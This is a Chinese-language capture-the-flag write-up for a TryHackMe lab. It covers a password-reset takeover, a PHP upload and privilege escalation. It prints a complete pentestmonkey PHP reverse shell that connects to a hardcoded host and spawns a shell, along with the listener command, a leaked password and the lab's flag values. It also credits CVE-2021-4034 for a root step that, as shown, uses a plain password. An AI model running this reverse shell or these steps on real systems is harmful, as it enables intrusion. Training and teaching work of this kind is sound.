# THM Sky Couriers 渗透测试 Writeup

**目标**: 10.49.182.51 (Sky Couriers) - TryHackMe 靶场  
**日期**: 2026-05-20  
**授权**: THM 授权靶场，全 IP 范围，无限制

---

## 1. 信息收集

### 端口扫描
| 端口   | 服务 | 版本          |
| ------ | ---- | ------------- |
| 22/tcp | SSH  | OpenSSH 8.2p1 |
| 80/tcp | HTTP | Apache 2.4.41 |

### Web 发现
- 标题: Sky Couriers (物流/快递服务)
- 目录: /phpMyAdmin, /v2 (管理员后台)
- reCAPTCHA 密钥泄露: `6Leba0sUAAAAAO2EGZ1QANKXUE2MYCd53aoQ1kEY`
- Facebook App ID 泄露: `181271706860160`

---

## 2. 初始访问

### 2.1 注册账户
- 注册页面: `/v2/admin/register.html`
- 注册测试账户: `user@test.com/test`

### 2.2 登录后台
- 登录页面: `/v2/admin/login.html`
- 登录接口: `POST /v2/admin/logincheck.php`

---

## 3. 权限提升 (水平权限绕过)

### 3.1 发现管理员账户
- 页面提示: "Please drop an email to admin@sky.thm"
- 管理员邮箱: `admin@sky.thm`

### 3.2 密码重置漏洞
- 漏洞接口: `POST /v2/lostpassword.php`
- 参数: `uname`, `npass`, `cpass`
- **漏洞**: 未验证用户身份，可重置任意用户密码
- 利用: 修改 uname 为 `admin@sky.thm`，成功重置管理员密码为 `test`

### 3.3 管理员登录
- 管理员账户: `admin@sky.thm/test`
- 获得完整管理员权限

---

## 4. 获取 Shell

### 4.1 文件上传漏洞
- 上传接口: `POST /v2/profile.php` (pimage 字段)
- 上传路径: `/v2/profileimages/`
- 上传 PHP 反向 shell

shell文件代码

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.241.203';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
```

### 4.2 反向 Shell

```bash
# 本机监听
nc -lvnp 1234

# 访问触发
http://10.49.182.51/v2/profileimages/shell.php
```

### 4.3 稳定 Shell
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z 挂起后
stty raw -echo; fg
```

---

## 5. 权限提升 (Root)

### 5.1 信息收集
- 当前用户: www-data
- 系统: Ubuntu 20.04.6 LTS, 内核 5.15.0-139-generic
- 发现用户: webdeveloper, ubuntu

### 5.2 凭证发现 (MongoDB)
```bash
# 连接 MongoDB (无认证)
mongo

# 查看数据库
show dbs

# 查看 backup 数据库
use backup
db.user.find()
```

**发现凭证**:
```json
{ "Name": "webdeveloper", "Pass": "BahamasChapp123!@#" }
```

### 5.3 切换用户
```bash
su - webdeveloper
# 密码: BahamasChapp123!@#
```

### 5.4 pkexec 提权 (关键技巧)

**问题**: pkexec 在非图形环境(SSH)下运行失败

**解决方案**: 使用 pkttyagent 进行交互式认证

**步骤**:
1. **终端1**: 获取当前 shell PID
   ```bash
   echo $$
   # 输出: 1504
   ```

2. **终端2**: 启动 pkttyagent 认证代理
   ```bash
   pkttyagent -p 1504
   ```

3. **终端1**: 触发 pkexec 认证
   ```bash
   pkexec /bin/bash
   ```

4. **终端2**: 完成认证
   ```
   === AUTHENTICATING FOR org.freedesktop.policykit.exec ===
   Authentication is needed to run `/bin/bash' as the super user
   Multiple identities can be used for authentication:
    1. webdeveloper
    2. Ubuntu (ubuntu)
   Choose identity to authenticate as (1-2): 1
   Password: [输入 BahamasChapp123!@#]
   === AUTHENTICATION COMPLETE ===
   ```

5. **终端1**: 获得 root shell
   ```bash
   root@ip-10-49-131-168:~#
   ```

---

## 6. Flags

| Flag      | 值                                 |
| --------- | ---------------------------------- |
| User Flag | `63191e4ece37523c9fe6bb62a5e64d45` |
| Root Flag | `3a62d897c40a815ecbe267df2f533ac6` |

---

## 7. 漏洞总结

| 漏洞               | 严重程度 | 说明                                |
| ------------------ | -------- | ----------------------------------- |
| 水平权限绕过       | 严重     | lostpassword.php 可重置任意用户密码 |
| 文件上传           | 高危     | profile.php 允许上传 PHP 文件       |
| MongoDB 未授权     | 高危     | 无认证访问，泄露用户凭证            |
| reCAPTCHA 密钥泄露 | 中危     | 前端泄露密钥                        |
| pkexec 版本漏洞    | 严重     | 版本 0.105 存在 CVE-2021-4034       |

---

## 8. 关键技术点

### 8.1 pkexec 非图形环境提权
**适用场景**:
- SSH 会话无图形界面
- pkexec 版本存在漏洞
- 需要交互式认证

**核心命令**:
```bash
# 终端1
echo $$  # 获取 PID
pkexec /bin/bash  # 触发认证

# 终端2
pkttyagent -p <PID>  # 启动认证代理
# 输入密码完成认证
```

### 8.2 MongoDB 信息收集
```bash
mongo
show dbs
use <database>
db.getCollectionNames()
db.<collection>.find()
```

---

## 9. 工具使用

| 工具              | 用途             |
| ----------------- | ---------------- |
| nmap              | 端口扫描         |
| gobuster          | 目录枚举         |
| curl              | Web 请求         |
| nc                | 反向 shell       |
| Burp Suite        | 密码重置抓包修改 |
| mongo             | 数据库查询       |
| pkexec/pkttyagent | 权限提升         |

---

## 10. 经验教训

1. **水平权限绕过**: 密码重置功能必须验证当前用户身份
2. **文件上传**: 需要限制文件类型，禁止上传可执行文件
3. **数据库安全**: MongoDB 必须启用认证
4. **组件更新**: pkexec/polkit 需要及时更新补丁
5. **密钥管理**: 敏感密钥不应硬编码在前端代码中
